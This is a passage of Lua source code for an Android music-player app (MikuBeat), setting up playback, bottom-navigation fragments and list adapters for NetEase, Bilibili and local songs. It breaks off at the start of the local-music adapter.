
--25年1月10日，开始大整改
--要加入哔站解析功能
--并整改数据结构，为本地音乐增加缓存，使得网易本地哔站相融
--1.13，整改完毕


local activity = activity
local bindClass = luajava.bindClass
local require = require

--如果首次进入，跳转欢迎并进行一些配置
if not activity.getSharedData("welcome")
  return activity.newActivity("activity/welcome").finish()
end

--设置Debug模式
if activity.getSharedData("isDebug")
  activity.setDebug(true)
 else
  activity.setDebug(false)
end

require "miku" --导入全局配置

local Http = Http
local math = math
local string = string
local os = os
local pcall = pcall
local tostring = tostring
local tointeger = tointeger
local print = print
local loadlayout = loadlayout

local File = bindClass "java.io.File"
--播放器
local MediaPlayer = bindClass "android.media.MediaPlayer"
player = MediaPlayer()
player.reset()
.setScreenOnWhilePlaying(true)
local volume = tonumber(activity.getSharedData("volume") or "0.6")
player.setVolume(volume, volume)
local Context = bindClass "android.content.Context"
local PopupMenu = bindClass "androidx.appcompat.widget.PopupMenu"
--recycler滚动监听
local RecyclerView = bindClass "androidx.recyclerview.widget.RecyclerView"
--recycler adapter导入项
local LinearLayoutManager = bindClass "androidx.recyclerview.widget.LinearLayoutManager"
local AdapterCreator = bindClass "github.daisukiKaffuChino.AdapterCreator"
local LuaCustRecyclerHolder = bindClass "github.daisukiKaffuChino.LuaCustRecyclerHolder"
local LuaCustRecyclerAdapter = bindClass "github.daisukiKaffuChino.LuaCustRecyclerAdapter"
--图片
local Glide = bindClass "com.bumptech.glide.Glide"
local DiskCacheStrategy = bindClass "com.bumptech.glide.load.engine.DiskCacheStrategy"
local Target = bindClass "com.bumptech.glide.request.target.Target"
--适配
local LuaFragment = bindClass "com.androlua.LuaFragment"
local BottomNavigationView = bindClass "com.google.android.material.bottomnavigation.BottomNavigationView"
--动画_向下滑出
--local HideBottomViewOnScrollBehavior = bindClass "com.google.android.material.behavior.HideBottomViewOnScrollBehavior"

--轮播图指示器与缩放动画
local IndicatorView = activity.loadDex(activity.getLuaPath("libs/Pager2Banner.dex")).loadClass("com.to.aboomy.pager2banner.IndicatorView")
local ScaleInTransformer = activity.loadDex(activity.getLuaPath("libs/Pager2Banner.dex")).loadClass("com.to.aboomy.pager2banner.ScaleInTransformer")
--音乐卡片_复制一份params保存状态
local Modifier = bindClass "java.lang.reflect.Modifier"
local jpairs = require "jpairs"
--键盘输入模式
local WindowManager = bindClass "android.view.WindowManager"
--数据存储
local cjson = require "cjson"
--模块化
local FileDrawable = require "FileDrawable" --图片转drawable对象函数
local musicList = require "res.musicList" --音乐列表table
local music163 = require ("music163" .. (activity.getSharedData("useParsing") and "Parsing" or ""))--网易音乐相关操作函数表
music163.makeSureDir() --确保文件夹存在
local historyManager = require "historyManager" --历史记录相关操作函数表
local animationMod = require "animationMod" --动画模块
local userAddManager = require "userAddManager" --用户添加管理
local loveManager = require "loveManager" --收藏管理
local update = require "update" --更新与公告
local localMusicManager = require "localMusicManager" --本地音乐管理
local biliManager = require "biliManager"
local myToast = require "myToast"
local moreAnimation = activity.getSharedData("moreAnimation") --动画开关
local playLastPlay = activity.getSharedData("playLastPlay") == nil and true or activity.getSharedData("playLastPlay")

activity
.setTitle("MikuBeat")
.setContentView(loadlayout("layout.layoutMain"))
.getWindow().setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_ADJUST_PAN)

local fiilInScreen = fiilInScreen
local fiilInScreenCard = fiilInScreenCard
local fillInCardLinear = fillInCardLinear
local playerCardMusicImgCard = playerCardMusicImgCard
local playerCardMusicImg = playerCardMusicImg
local playerCardMsgs = playerCardMsgs
local playerCardName = playerCardName
local playerCardArtist = playerCardArtist
local playerCardDragBarLine = playerCardDragBarLine
local playerCardDragBar = playerCardDragBar
local playerCardMusicCurrentTime = playerCardMusicCurrentTime
local playerCardMusicEndTime = playerCardMusicEndTime
local playerCardItems = playerCardItems
local playerCardLove = playerCardLove
local playerCardPrevious = playerCardPrevious
local playerCardPlay = playerCardPlay
local playerCardNext = playerCardNext
local playerCardOrder = playerCardOrder

local copyText = copyText
--.setNavigationBarColor()
--设置动画
--bottombar.layoutParams.setBehavior(HideBottomViewOnScrollBehavior())
--add.layoutParams.setBehavior(HideBottomViewOnScrollBehavior())
--[[
mContent.onApplyWindowInsets = function(view, insets)
  local systemInsets = insets.getSystemWindowInsets()
  view.setPadding(
  systemInsets.left,
  systemInsets.top,
  systemInsets.right,
  systemInsets.bottom)
  return insets
end
--]]
--[[
sharedData:
nowPlayTable: 当前播放列表，通过playManager.getPlayTable()方法直接取得表
nowPlayIndex: 当前播放索引
loopOneOrder: 单曲循环
]]

--无压缩设置图片
local function applyGlideUncompressed(file, view, isUrl)
  if not isUrl
    file = activity.getLuaDir() .. file
  end
  Glide.with(activity)
  .load(file)
  .override(Target.SIZE_ORIGINAL, Target.SIZE_ORIGINAL)
  .diskCacheStrategy(DiskCacheStrategy.ALL)
  .into(view)
end

--正常设置图片
local function applyGlide(file, view, isUrl)
  if not isUrl
    file = activity.getLuaDir() .. file
  end
  Glide.with(activity)
  .load(file)
  .into(view)
end

--毫秒转分:秒格式
local function ms2minsec(t)
  local s=t/1000
  local sec=tointeger(s%60)
  if sec<10 then
    sec="0"..sec
  end
  local min=tointeger(s//60)
  if min<10 then
    min="0"..min
  end
  return min..":"..sec
end

--小数转百分数
local function dec2per(n)
  return tointeger(100*n).."%"
end

--转换毫秒
local function convertMilliseconds(milliseconds)
  local totalSeconds = milliseconds / 1000
  local seconds = math.floor(totalSeconds % 60) -- 秒数
  local minutes = math.floor(totalSeconds / 60) -- 分钟数
  local millisecondsPart = string.format("%02d", math.floor((milliseconds % 1000) / 10))
  local formattedTime = string.format("%02d:%02d.%s", minutes, seconds, millisecondsPart)
  return formattedTime
end

--由于拆分出模块MediaPlayer实例会被误回收，只得在main里封装一个playerManager，这样做也使得耦合性强的问题得以应对
local playerManager = {}

function playerManager.playMusic()
  print("使用了重写前的playMusic")
end

function playerManager.setPlayTable(table)
  activity.setSharedData("nowPlayTable", cjson.encode(table))
end

function playerManager.setPlayIndex(index)
  activity.setSharedData("nowPlayIndex", index)
end

function playerManager.getPlayIndex()
  return activity.getSharedData("nowPlayIndex")
end

function playerManager.getPlayTable()
  local ok, result = pcall(cjson.decode, activity.getSharedData("nowPlayTable"))
  if ok
    return result
   else
    return {}
  end
end

--方便调用
local getPlayTable = playerManager.getPlayTable
local setPlayTable = playerManager.setPlayTable
local setPlayIndex = playerManager.setPlayIndex
local getPlayIndex = playerManager.getPlayIndex

if not playLastPlay
  setPlayIndex()
end

function playerManager.previous()
  local index = activity.getSharedData("nowPlayIndex")
  if index
    playerManager.playMusic(index - 1)--此处判断index为0, 为#list+1, 判断from
  end
end

--自动获取信息并播放下一首
function playerManager.nextPlay()
  local index = activity.getSharedData("nowPlayIndex")
  if index
    playerManager.playMusic(index + 1)
  end
end

--自然播放完成下一曲
function playerManager.nextPlayAuto()
  if activity.getSharedData("loopOneOrder")
    local playTable = getPlayTable()
    local playIndex = getPlayIndex()
    if playTable and playIndex
      if (playTable[playIndex] or {})["from"] ~= "bili"
        player.start()
       else
        -- 为集贸哔站的这么特殊
        playerManager.playMusic(playIndex)
      end
    end
   else
    playerManager.nextPlay()
  end
end

function loveManager.loveClick()
  print("使用了重写前的loveClick")
end

----------------以下为配置底栏，fragment----------------
local return3Flag, return1Flag
--初始化当前Fragment的表索引
local nowIndex = activity.getSharedData("startPage") or 1

--Fragment表
local Fragments = {
  LuaFragment(loadlayout("layout.home")),
  LuaFragment(loadlayout("layout.music")),
  LuaFragment(loadlayout("layout.more")),
  LuaFragment(loadlayout("layout.about")),
  LuaFragment(loadlayout("layout.setting")),
  LuaFragment(loadlayout("layout.total")),
  LuaFragment(loadlayout("layout.playList")),
}

--获取fragmentManager实例
local fragmentManager = activity.getSupportFragmentManager()

--初始化Fragment
fragmentManager.beginTransaction()
.add(fragmentContainer.getId(), Fragments[1])
.add(fragmentContainer.getId(), Fragments[2])
.add(fragmentContainer.getId(), Fragments[3])
.add(fragmentContainer.getId(), Fragments[4])
.add(fragmentContainer.getId(), Fragments[5])
.add(fragmentContainer.getId(), Fragments[6])
.add(fragmentContainer.getId(), Fragments[7])
.hide(Fragments[1])
.hide(Fragments[2])
.hide(Fragments[3])
.hide(Fragments[4])
.hide(Fragments[5])
.hide(Fragments[6])
.hide(Fragments[7])
.show(Fragments[nowIndex])
.commit()

-- Fragment hide show页面
-- @ param int index 要显示的页面的表索引
local function replace(index, dontUpdate)
  -- 获取FragmentTransaction
  local cache = fragmentManager.beginTransaction()
  -- 简单设置一个Transition动画 --根据mdc设计规范，不应该有动画
  --但是话又说过来
  .setCustomAnimations(
  MDC_R.anim.mtrl_bottom_sheet_slide_in,
  MDC_R.anim.mtrl_bottom_sheet_slide_out)
  -- 通过hide show替换当前Fragment
  --提交transaction
  if return3Flag
    cache.hide(Fragments[return3Flag])
    return3Flag=false
   elseif return1Flag
    cache.hide(Fragments[return1Flag])
    return1Flag=false
   else
    cache.hide(Fragments[nowIndex])
  end
  cache.show(Fragments[index])
  if index == 5
    usedNow.show()
   else
    usedNow.hide()
  end
  cache.commit()
  if not dontUpdate
    nowIndex = index
  end
end

about.onClick = function()
  replace(4, true)
  return3Flag = 4
end

setting.onClick = function()
  replace(5, true)
  return3Flag = 5
end

totalHome.onClick = function()
  replace(6, true)
  return1Flag = 6
end

--底栏item信息
local bottombarItem ={
  {
    ["name"] = "首页", --名称
    ["icon1"] = FileDrawable("res/imgs/home1.png"), --未选中时的图标
    ["icon2"] = FileDrawable("res/imgs/home2.png"), --选中时的图标
  },
  {
    ["name"] = "音乐",
    ["icon1"] = FileDrawable("res/imgs/music1.png"),
    ["icon2"] = FileDrawable("res/imgs/music2.png"),
  },
  {
    ["name"] = "更多",
    ["icon1"] = FileDrawable("res/imgs/more1.png"),
    ["icon2"] = FileDrawable("res/imgs/more2.png"),
  },
}

--底栏添加和设置选项
bottombar.menu.add(0,0,0,bottombarItem[1]["name"]).setIcon(bottombarItem[1]["icon1"])
bottombar.menu.add(0,1,1,bottombarItem[2]["name"]).setIcon(bottombarItem[2]["icon1"])
bottombar.menu.add(0,2,2,bottombarItem[3]["name"]).setIcon(bottombarItem[3]["icon1"])
task(10, function()
  bottombar.menu.getItem(nowIndex-1).setIcon(bottombarItem[nowIndex]["icon2"])--这个只是为了保持一致，图标是会刷新的，懵逼
  bottombar.setSelectedItemId(nowIndex - 1)
  --更改设置后recreat，bottombar选中项竟然没有刷新，只得延迟
end)

--print(bottombar.findViewById(2))--byId
--print(bottombar.menu.getItem(2))--byIndex

--底栏选项点击监听
bottombar.setOnNavigationItemSelectedListener(BottomNavigationView.OnNavigationItemSelectedListener{
  onNavigationItemSelected=function(item)
    local itemId = item.getItemId() --itemId是id，不是index
    bottombar.menu.getItem(nowIndex-1).setIcon(bottombarItem[nowIndex]["icon1"]) --设置旧当前页面选项图标为未选中图标
    replace(itemId+1) --更新显示页面和nowIndex
    bottombar.menu.getItem(nowIndex-1).setIcon(bottombarItem[nowIndex]["icon2"]) --设置新当前页面选项图标为已选中图标，注意此时nowIndex已更新

    if itemId == 1 and add.show() or add.hide() end

    return true
  end
})

--一行解决控件联动。
--music页面TabLayout和ViewPager联动
mtab.setupWithViewPager(cvpg)

cvpg.addOnPageChangeListener({
  onPageScrollStateChanged = function(a)
    add.show()
end})

if nowIndex ~= 2 add.hide() end
usedNow.hide()

local cachePlayIndex = getPlayIndex()
local musicListAdapter
local historyAdapter
local userAddAdapter
local loveAdapter
local localMusicAdapter
local userAdds
local historys
local loves
local localMusicCacheList
local adapterManager = {}
local searchMusics = {}
local totalMusics = {}
local nowPlayMusics = {}
local nowPlayListAdapter
local totalMusicAdapter
function adapterManager.refreshAdapter(h, m, u, l, hh, uu, ll)
  if h
    if hh
      historys = historyManager.getHistory()
    end
    historyAdapter.notifyDataSetChanged()
  end
  if m
    musicListAdapter.notifyDataSetChanged()
  end
  if u
    if uu
      userAdds = userAddManager.getUserAddMusic()
    end
    userAddAdapter.notifyDataSetChanged()
  end
  if l
    if ll
      loves = loveManager.getLoveMusic()
    end
    loveAdapter.notifyDataSetChanged()
  end
end

function adapterManager.refreshLocalAdapter(refresh)
  if refresh
    localMusicCacheList = localMusicManager.getCacheMsgs()
  end
  localMusicAdapter.notifyDataSetChanged()
end

-----------以下为音乐界面内置音乐recycler适配------------

local musicListAdpTable = {
  getItemCount = function()
    return #musicList
  end,

  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard", view))
    holder.view.setTag(view)

    view.cardLoveImg.onClick = function()
      local info = musicList[holder.getAdapterPosition()+1]["info"]
      local from = musicList[holder.getAdapterPosition()+1]["from"]
      loveManager.loveClick(info, from, view.cardLoveImg)
      adapterManager.refreshAdapter(true, false, false, true, false, false, true)
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        setPlayTable(musicList)
        playerManager.playMusic(holder.getAdapterPosition()+1)
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local pop = PopupMenu(activity, view.cardPopMenu)
      local info = musicList[holder.getAdapterPosition()+1]["info"]
      local from = musicList[holder.getAdapterPosition()+1]["from"]
      pop.menu.add("跳转MV").onMenuItemClick = function()
        if canClick
          if from == "wyy"
            music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
           elseif from == "bili"
            biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
          end
         else
          myToast.toast("别催别催，在学了（｀へ´）")
        end
      end
      pop.menu.add("歌曲信息").onMenuItemClick = function()
        if from == "wyy"
          music163.musicInfoDialog(info)
         elseif from == "bili"
          biliManager.musicInfoDialog(info)
         else
          --baka
        end
      end
      pop.menu.add("导出歌曲").onMenuItemClick = function()
        if canClick
          if from == "wyy"
            music163.saveToSD(info)
           elseif from == "bili"
            biliManager.saveToSD(info)
           else
            --baka
          end
         else
          myToast.toast("别催别催，在学了（｀へ´）")
        end
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        local sl
        if from == "wyy"
          sl = music163.idtosl(info)
         elseif from == "bili"
          sl = "https://m.bilibili.com/video/"..info
         else
          --baka
        end
        local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
        copyText(text)
        myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
      end
      pop.menu.add("删除缓存").onMenuItemClick = function()
        if from == "wyy"
          music163.subMusicById(info)
         elseif from == "bili"
          biliManager.subMusicByBv(info)
         else
          --baka
        end
      end
      pop.show()
    end

    return holder
  end,

  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = position + 1

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end

    local from = musicList[index]["from"]
    local info = musicList[index]["info"]

    if loveManager.isLoved(info, from)
      applyGlide("/res/imgs/loved.png", view.cardLoveImg)
     else
      applyGlide("/res/imgs/love.png", view.cardLoveImg)
    end

    if from == "wyy"
      music163.idGetMsg(info,function(msgs)
        --print(dump(msgs))
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
     elseif from == "bili"
      biliManager.bvGetMsg(info, function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
      --bili
     else
      print("发生了奇怪的事情@musicListAdpTable.onBindViewHolder")
    end

  end,
}
musicListAdapter = LuaCustRecyclerAdapter(AdapterCreator(musicListAdpTable))
musicMusicList
.setAdapter(musicListAdapter)
.setLayoutManager(LinearLayoutManager(activity))




----------以下为音乐界面用户添加recycler适配------------

userAdds = userAddManager.getUserAddMusic()
local userAddListAdpTable = {
  getItemCount = function()
    return #userAdds
  end,

  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard", view))
    holder.view.setTag(view)

    view.cardLoveImg.onClick = function()
      local info = userAdds[holder.getAdapterPosition()+1]["info"]
      local from = userAdds[holder.getAdapterPosition()+1]["from"]
      loveManager.loveClick(info, from, view.cardLoveImg)
      adapterManager.refreshAdapter(true, false, false, true, false, false, true)
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        setPlayTable(userAdds)
        playerManager.playMusic(holder.getAdapterPosition()+1)
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local info = userAdds[holder.getAdapterPosition()+1]["info"]
      local from = userAdds[holder.getAdapterPosition()+1]["from"]

      local pop = PopupMenu(activity, view.cardPopMenu)
      pop.menu.add("跳转MV").onMenuItemClick = function()
        if canClick
          if from == "wyy"
            music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
           elseif from == "bili"
            biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
          end
         else
          myToast.toast("别催别催，在学了（｀へ´）")
        end
      end
      pop.menu.add("歌曲信息").onMenuItemClick = function()
        if from == "wyy"
          music163.musicInfoDialog(info)
         elseif from == "bili"
          biliManager.musicInfoDialog(info)
         else
          --baka
        end
      end
      pop.menu.add("导出歌曲").onMenuItemClick = function()
        if canClick
          if from == "wyy"
            music163.saveToSD(info)
           elseif from == "bili"
            biliManager.saveToSD(info)
           else
            --baka
          end
         else
          myToast.toast("别催别催，在学了（｀へ´）")
        end
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        local sl
        if from == "wyy"
          sl = music163.idtosl(info)
         elseif from == "bili"
          sl = "https://m.bilibili.com/video/"..info
         else
          --baka
        end
        local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
        copyText(text)
        myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
      end
      pop.menu.add("删除缓存").onMenuItemClick = function()
        if from == "wyy"
          music163.subMusicById(info)
         elseif from == "bili"
          biliManager.subMusicByBv(info)
         else
          --baka
        end
      end
      pop.menu.add("删除").onMenuItemClick = function()
        userAddManager.subUserAddMusic(holder.getAdapterPosition()+1)
        userAdds = userAddManager.getUserAddMusic()
        userAddAdapter.notifyItemRemoved(holder.getAdapterPosition())
      end
      pop.show()
    end

    return holder
  end,

  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = position + 1

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end

    local info = userAdds[index]["info"]
    local from = userAdds[index]["from"]

    if loveManager.isLoved(info)
      applyGlide("/res/imgs/loved.png", view.cardLoveImg)
     else
      applyGlide("/res/imgs/love.png", view.cardLoveImg)
    end

    if from == "wyy"
      music163.idGetMsg(info,function(msgs)
        --print(dump(msgs))
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
     elseif from == "bili"
      biliManager.bvGetMsg(info, function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
     else
    end

  end,
}

userAddAdapter = LuaCustRecyclerAdapter(AdapterCreator(userAddListAdpTable))
musicUserAddList
.setAdapter(userAddAdapter)
.setLayoutManager(LinearLayoutManager(activity))


--------------以下为音乐界面收藏recycler适配------------

loves = loveManager.getLoveMusic()
local loveAdpTable = {
  getItemCount = function()
    return #loves
  end,
  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard", view))
    holder.view.setTag(view)

    view.cardLoveImg.onClick = function()
      local info = loves[holder.getAdapterPosition()+1]["info"]
      --loveManager.subLoveMusic2(id)
      loveManager.subLoveMusic(holder.getAdapterPosition()+1)
      loves = loveManager.getLoveMusic()
      loveAdapter.notifyItemRemoved(holder.getAdapterPosition())
      adapterManager.refreshAdapter(true, true, true)
      local flag = info == getPlayTable()[getPlayIndex()]["info"]
      if flag
        applyGlideUncompressed("/res/imgs/love.png", playerCardLove)
      end
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        local index = holder.getAdapterPosition()+1
        --myToast.toast(tostring(index))
        setPlayTable(loves)
        playerManager.playMusic(index)
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local info = loves[holder.getAdapterPosition()+1]["info"]
      local from = loves[holder.getAdapterPosition()+1]["from"]

      local pop = PopupMenu(activity, view.cardPopMenu)

      if from ~= "local"
        pop.menu.add("跳转MV").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
             elseif from == "bili"
              biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("歌曲信息").onMenuItemClick = function()
        if from == "wyy"
          music163.musicInfoDialog(info)
         elseif from == "bili"
          biliManager.musicInfoDialog(info)
         elseif from == "local"
          localMusicManager.musicInfoDialog(info)
         else
          --baka
        end
      end
      if from ~= "local"
        pop.menu.add("导出歌曲").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.saveToSD(info)
             elseif from == "bili"
              biliManager.saveToSD(info)
             else
              --baka
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        local sl
        if from == "wyy"
          sl = music163.idtosl(info)
         elseif from == "bili"
          sl = "https://m.bilibili.com/video/"..info
         elseif from == "local"
          if File(info).isFile()
            activity.shareFile(info)
           else
            myToast.toast("文件不存在")
          end
         else
          --baka
        end
        if sl
          local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
          copyText(text)
          myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
        end
      end
      if from ~= "local"
        pop.menu.add("删除缓存").onMenuItemClick = function()
          if from == "wyy"
            music163.subMusicById(info)
           elseif from == "bili"
            biliManager.subMusicByBv(info)
           else
            --baka
          end
        end
      end
      pop.show()
    end

    return holder
  end,
  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = position + 1

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end
    applyGlide("/res/imgs/loved.png", view.cardLoveImg)
    local from = loves[index]["from"]
    local info = loves[index]["info"]
    if from == "wyy"
      music163.idGetMsg(info,function(msgs)
        --print(dump(msgs))
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
     elseif from == "bili"
      biliManager.bvGetMsg(info, function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)
     elseif from == "local"
      local msgs = localMusicManager.getCacheMsgByPath(info)

      view.cardMusicArtist.text = (msgs and msgs["title"]) or "E: no Title"
      view.cardMusicName.text = string.match(info, "[^/]+$") or "E: no Path"

      if (msgs or {}).cover
        pcall(function()
          Glide.with(activity).load(msgs.cover).into(view.cardMusicPicture)
        end)
        view.cardMusicPicture.colorFilter=0x00000000
        --view.cardMusicPicture.setImageBitmap(cover)
       else
        applyGlide("/res/imgs/miku3.png", view.cardMusicPicture)
        view.cardMusicPicture.colorFilter=Colors.colorOnSurface
      end
     else
    end
  end,
}

loveAdapter = LuaCustRecyclerAdapter(AdapterCreator(loveAdpTable))
musicLoveList
.setAdapter(loveAdapter)
.setLayoutManager(LinearLayoutManager(activity))

----------以下为首页历史记录recycler适配-----------

historys = historyManager.getHistory()
local historyOfHomeAdpTab = {
  getItemCount = function()
    return #historys
  end,
  onCreateViewHolder = function()
    local view = {}
    local holder = LuaCustRecyclerHolder(loadlayout("layout.musicCard2", view))
    holder.view.setTag(view)


    view.cardLoveImg.onClick = function()
      local index = #historys - holder.getAdapterPosition()
      local from = historys[index]["from"]
      local info = historys[index]["info"]
      loveManager.loveClick(info, from, view.cardLoveImg)
      adapterManager.refreshAdapter(false, true, true, true, false, false, true)
      if from == "local"
        localMusicAdapter.notifyDataSetChanged()
      end
    end

    view.cardToChooseMusic.onClick = function()
      if canClick
        setPlayTable(historys)
        playerManager.playMusic(#historys - holder.getAdapterPosition())
       else
        myToast.toast("别催别催，在学了（｀へ´）")
      end
    end

    view.cardPopMenu.onClick = function()
      local info = historys[#historys - holder.getAdapterPosition()]["info"]
      local from = historys[#historys - holder.getAdapterPosition()]["from"]

      local pop = PopupMenu(activity, view.cardPopMenu)

      if from ~= "local"
        pop.menu.add("跳转MV").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
             elseif from == "bili"
              biliManager.watchMV(info, player, applyGlideUncompressed, playerCardPlay)
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("歌曲信息").onMenuItemClick = function()
        if from == "wyy"
          music163.musicInfoDialog(info)
         elseif from == "bili"
          biliManager.musicInfoDialog(info)
         elseif from == "local"
          localMusicManager.musicInfoDialog(info)
         else
          --baka
        end
      end
      if from ~= "local"
        pop.menu.add("导出歌曲").onMenuItemClick = function()
          if canClick
            if from == "wyy"
              music163.saveToSD(info)
             elseif from == "bili"
              biliManager.saveToSD(info)
             else
              --baka
            end
           else
            myToast.toast("别催别催，在学了（｀へ´）")
          end
        end
      end
      pop.menu.add("分享歌曲").onMenuItemClick = function()
        local sl
        if from == "wyy"
          sl = music163.idtosl(info)
         elseif from == "bili"
          sl = "https://m.bilibili.com/video/"..info
         elseif from == "local"
          if File(info).isFile()
            activity.shareFile(info)
           else
            myToast.toast("文件不存在")
          end
         else
          --baka
        end
        if sl
          local text = "分享歌曲:\n"..view.cardMusicName.text.."--"..view.cardMusicArtist.text.."\n"..sl.." (来自@MikuBeat)"
          copyText(text)
          myToast.toast("已经将链接放在剪切板里了(◔◡◔)")
        end
      end
      if from ~= "local"
        pop.menu.add("删除缓存").onMenuItemClick = function()
          if from == "wyy"
            music163.subMusicById(info)
           elseif from == "bili"
            biliManager.subMusicByBv(info)
           else
            --baka
          end
        end
      end
      pop.menu.add("删除").onMenuItemClick = function()
        historyManager.subHistory(#historys - holder.getAdapterPosition())
        historys = historyManager.getHistory()
        historyAdapter.notifyItemRemoved(holder.getAdapterPosition())
      end
      pop.show()
    end

    return holder
  end,
  onBindViewHolder = function(holder, position)
    local view = holder.view.getTag()
    local index = #historys - position

    if moreAnimation
      animationMod.onClickBounce(view.cardToChooseMusic, 0.98, 200)
      animationMod.onClickBounce(view.cardLoveImg, 0.9, 200)
      animationMod.onClickBounce(view.cardPopMenu, 0.9, 200)
    end

    if loveManager.isLoved(historys[index]["info"])
      applyGlide("/res/imgs/loved.png", view.cardLoveImg)
     else
      applyGlide("/res/imgs/love.png", view.cardLoveImg)
    end

    local from = historys[index]["from"]
    local info = historys[index]["info"]

    if from == "wyy"
      music163.idGetMsg(info,function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["pic"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)

     elseif from == "bili"
      biliManager.bvGetMsg(info, function(msgs)
        if msgs["code"] == 200
          pcall(function()
            Glide.with(activity).load(msgs["cover"]).into(view.cardMusicPicture)
            view.cardMusicPicture.colorFilter=0x00000000
          end)
          if msgs["name"] view.cardMusicName.text = msgs["name"] end
          if msgs["artist"] view.cardMusicArtist.text = msgs["artist"] end
        end
      end)

     elseif from == "local"
      local msgs = localMusicManager.getCacheMsgByPath(info)
      view.cardMusicArtist.text = (msgs and msgs["title"]) or "E: no Title"
      view.cardMusicName.text = string.match(info, "[^/]+$") or "E: no Path"

      if (msgs or {}).cover
        pcall(function()
          Glide.with(activity).load(msgs.cover).into(view.cardMusicPicture)
        end)
        view.cardMusicPicture.colorFilter=0x00000000
        --view.cardMusicPicture.setImageBitmap(cover)
       else
        applyGlide("/res/imgs/miku1.png", view.cardMusicPicture)
        view.cardMusicPicture.colorFilter=Colors.colorOnSurface
      end
     else
    end

  end,
}

historyAdapter = LuaCustRecyclerAdapter(AdapterCreator(historyOfHomeAdpTab))
historyOfHome
.setAdapter(historyAdapter)
.setLayoutManager(LinearLayoutManager(activity))


---------------以下为本地歌曲------------


localMusicCacheList = localMusicManager.getCacheMsgs()
local localListAdpTable = {
